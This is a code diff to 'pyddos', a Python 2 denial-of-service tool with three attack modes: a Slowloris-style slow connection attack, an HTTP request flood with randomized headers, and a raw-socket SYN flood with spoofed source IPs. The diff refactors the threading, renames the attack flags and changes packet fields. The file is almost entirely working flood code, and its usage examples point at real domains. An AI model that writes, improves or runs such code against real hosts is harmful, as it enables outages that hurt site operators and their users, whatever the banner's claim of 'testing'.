@@ -9,7 +9,7 @@ title = '''
     _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
            ____/                                            _|         
                                                                     
- DDos python script | Script use for testing ddos | Ddos attack     
+ DDos python script | Script used for testing ddos | Ddos attack     
  Author: ___T7hM1___                                                
  Github: http://github.com/t7hm1/pyddos                             
  Version:'''+version+''' 
@@ -25,7 +25,6 @@ import httplib,urlparse
 from random import *
 from socket import *
 from struct import *
-from Queue import Queue
 from threading import *
 from argparse import ArgumentParser,RawTextHelpFormatter
 
@@ -61,7 +60,6 @@ if os.name == 'nt':
 	colorama.init()
 
 signal.signal(signal.SIGPIPE,signal.SIG_DFL)
-screenLock=Semaphore(value=99999)
 
 def fake_ip():
 	skip = '127'
@@ -100,9 +98,14 @@ def add_bots():
 	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
 	return bots
 
-
-class Pyslow:
-	def __init__(self,tgt,port,to,threads,sleep):
+class Pyslow(object):
+	def __init__(self,
+		        tgt,
+		        port,
+		        to,
+		        threads,
+		        sleep):
+	        super(Pyslow,self).__init__()
 		self.tgt = tgt
 		self.port = port
 		self.to = to
@@ -164,7 +167,7 @@ class Pyslow:
 		lsocks=[]
 		lhandlers=[]
 		cprint('\t\tBuilding sockets','blue')
-		while socks < range(int(self.threads)):
+		while socks < (int(self.threads)):
 			try:
 				sock = self.building_socket()
 				if sock:
@@ -194,14 +197,15 @@ class Pyslow:
 				sys.exit(cprint('[-] Canceled by user','red'))
 		print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
 		time.sleep(self.sleep)
+
 class Requester(Thread):
-	def __init__(self,tgt,threads):
+	def __init__(self,tgt):
 		Thread.__init__(self)
 		self.tgt = tgt
-		self.threads=threads
 		self.port = None
 		self.ssl = False
 		self.req = []
+		self.lock=Lock()
 		url_type = urlparse.urlparse(self.tgt)
 		if url_type.scheme == 'https':
 			self.ssl = True
@@ -209,18 +213,6 @@ class Requester(Thread):
 				self.port = 443
 		else:
 			self.port = 80
-		ts = []
-		try:
-			t=Thread(target=self._run)
-			t.daemon=True
-			ts.append(t)
-			t.start()
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
-			t.stop()
-		t.join(2)
-	def _run(self):
-		self.requesting()
 	def header(self):
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
 		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
@@ -252,7 +244,7 @@ class Requester(Thread):
 		http_header = self.header()
 		return (url,http_header)
 
-	def requesting(self):
+	def run(self):
 		try:
 			if self.ssl:
 				conn = httplib.HTTPSConnection(self.tgt,self.port)
@@ -263,14 +255,12 @@ class Requester(Thread):
 				(url,http_header) = self.data()
 				method = choice(['get','post'])
 				reqter.request(method.upper(),url,None,http_header)
-				print colored('[-->] Requested your target: ','green') + colored(self.tgt,'red') 
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user','red'))
 		except Exception,e:
 			print e
 		finally:
-			screenLock.release()
-		self.closeConnections()
+			self.closeConnections()
 	def closeConnections(self):
 		for conn in self.req:
 			try:
@@ -279,26 +269,17 @@ class Requester(Thread):
 				pass
 
 class Synflood(Thread):
-	def __init__(self,tgt,port,ip,sock=None):
+	def __init__(self,tgt,ip,sock=None):
 		Thread.__init__(self)
 		self.tgt = tgt
-		self.port = port 
 		self.ip = ip
 		self.psh = ''
 		if sock is None:
 			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
-		self.ts=[]
-		try:
-			t = Thread(target=self.run)
-			t.setDaemon(True)
-			t.daemon=True
-			t.start()
-			self.ts.append(t)
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
-		t.join()
-	def run(self):
-		self.syn_flood()
+			self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
+		else:
+			self.sock=sock
+		self.lock=Lock()
 	def checksum(self):
 		s = 0 
 		for i in range(0,len(self.psh),2):
@@ -309,17 +290,14 @@ class Synflood(Thread):
 		s = ~s & 0xffff
 
 		return s
-	def syn_flood(self):
-		
-		self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
-
+	def Building_packet(self):
 		ihl=5
 		version=4
 		tos=0
 		tot=40
 		id=54321
 		frag_off=0
-		ttl=255
+		ttl=64
 		protocol=IPPROTO_TCP
 		check=10
 		s_addr=inet_aton(self.ip)
@@ -328,7 +306,7 @@ class Synflood(Thread):
 		ihl_version = (version << 4) + ihl
 		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)
 
-		source = 1234
+		source = 54321
 		dest = 80
 		seq = 0
 		ack_seq = 0
@@ -361,30 +339,32 @@ class Synflood(Thread):
 		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
 		packet = ip_header + tcp_header
 
-		try: 
-			print colored('[-->] Synflood to ','green') + colored(self.tgt,'red')
-			self.sock.sendto(packet,(self.tgt,int(self.port)))
-			screenLock.acquire()
+		return packet
+
+	def run(self):
+		packet=self.Building_packet()
+		try:
+			self.lock.acquire()
+			self.sock.sendto(packet,(self.tgt,0))
 		except KeyboardInterrupt:
-			sys.exit()
+			sys.exit(cprint('[-] Canceled by user','red'))
 		except Exception,e:
 			cprint(e,'red')
 		finally:
-			screenLock.release()
-
+			self.lock.release()
 
 def main():
 	parser = ArgumentParser(
-		usage='./%(prog)s -d [target] [option]',
-		version=version,
-		formatter_class=RawTextHelpFormatter,
-		prog='pyddos',
-		description=cprint(title,'white',attrs=['bold']),
-		epilog='''
+        usage='./%(prog)s -t [target] -p [port] -t [number threads]',
+        version=version,
+        formatter_class=RawTextHelpFormatter,
+        prog='pyddos',
+        description=cprint(title,'white',attrs=['bold']),
+        epilog='''
 Example:
-    ./%(prog)s -d www.example.com -p 80 -T 2000
-    ./%(prog)s -d www.domain.com -s 100
-    ./%(prog)s -d www.google.com --synflood -T 5000 -t 10.0
+    ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
+    ./%(prog)s -d www.domain.com -s 100 -Request
+    ./%(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
 '''
 )
 	options = parser.add_argument_group('options','')
@@ -394,10 +374,10 @@ Example:
 	options.add_argument('-p',metavar='<int>',default=80,help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|','red'))
 	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
 	options.add_argument('-i',metavar='<ip address>',default=False,help='Specify spoofed ip unless use fake ip')
+	options.add_argument('-Request',action='store_true',help='Enable request target')
+	options.add_argument('-Synflood',action='store_true',help='Enable synflood attack')
+	options.add_argument('-Pyslow',action='store_true',help='Enable pyslow attack')
 	options.add_argument('--fakeip',action='store_true',default=False,help='Option to create fake ip if not specify spoofed ip')
-	options.add_argument('--request',action='store_true',help='Enable request target')
-	options.add_argument('--synflood',action='store_true',help='Enable synflood attack')
-	options.add_argument('--pyslow',action='store_true',help='Enable pyslow attack')
 	args = parser.parse_args()
 	if args.d == False:
 		parser.print_help()
@@ -405,7 +385,7 @@ Example:
 	add_bots();add_useragent()
 	if args.d:
 		check_tgt(args)
-	if args.synflood:
+	if args.Synflood:
 		uid = os.getuid()
 		if uid == 0:
 			cprint('[*] You have enough permisson to run this script','green')
@@ -413,7 +393,11 @@ Example:
 		else:
 			sys.exit(cprint('[-] You haven\'t enough permission to run this script','red'))
 		tgt=check_tgt(args)
+		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
+		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
 		ts=[]
+		threads=[]
+		print colored('[*] Started SYN Flood: ','blue')+colored(tgt,'red')
 		while 1:
 			if args.i == False:
 				args.fakeip = True
@@ -422,32 +406,30 @@ Example:
 			else:
 				ip = args.i
 			try:
-				for t in range(int(args.T)):
-					t=Thread(target=Synflood,args=(tgt,args.p,ip))
-					t.setDaemon(True)
-					t.daemon=True
-					t.start()
-					ts.append(t)
+				for x in xrange(0,args.T):
+					thread=Synflood(tgt,ip,sock=synsock)
+					thread.setDaemon(True)
+					thread.start()
+					thread.join()
 			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
-			t.join()
-	elif args.request:
+	elif args.Request:
 		tgt = args.d
-		threads = int(args.T)
-		ts=[]
+		threads = []
+		print colored('[*] Start send request to: ','blue')+colored(tgt,'red')
 		while 1:
 			try:
-				for x in range(int(args.T)):
-					t = Requester(tgt,threads)
-					ts.append(t);t.daemon=True
+				for x in xrange(int(args.T)):
+					t=Requester(tgt)
+					t.setDaemon(True)
 					t.start()
-				t.join(1)
+					t.join()
 			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
-	elif args.pyslow:
+	elif args.Pyslow:
 		try:
 			tgt = args.d
-			port = int(args.p)
+			port = args.p
 			to = float(args.t)
 			st = int(args.s)
 			threads = int(args.T)
@@ -463,8 +445,6 @@ Example:
 		parser.print_help()
 		print
 		sys.exit(cprint('[-] You must choose attack type','red'))
-
-
 
 if __name__ == '__main__':
 	main()
